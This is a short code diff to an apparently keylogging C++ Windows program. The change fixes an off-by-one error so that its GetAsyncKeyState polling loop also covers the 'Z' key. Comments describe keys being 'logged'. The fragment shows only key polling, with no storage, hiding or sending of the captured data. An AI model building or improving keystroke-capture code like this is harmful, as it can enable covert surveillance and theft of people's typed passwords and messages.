@@ -12,7 +12,7 @@ std::unordered_map<int, int> was_key_down;
 int main(){
     // Initizializing unordered map
     int index_count = 0;
-    for (int key = 0x20; key < 0x5A; key++){
+    for (int key = 0x20; key <= 0x5A; key++){
         was_key_down[key] = false;
     }
     
@@ -24,7 +24,7 @@ int main(){
             return 0;
         } else {
             // Running through all the keys
-            for (int key = 0x20; key < 0x5A; key++){
+            for (int key = 0x20; key <= 0x5A; key++){
                 // Checking if this key should be logged
                 if (GetAsyncKeyState(key) & 0x8000){ // Is it pressed? [Yes to continue]
                     if (was_key_down[key] == false){ // Has the user been keeping it pressed? [No to continue]
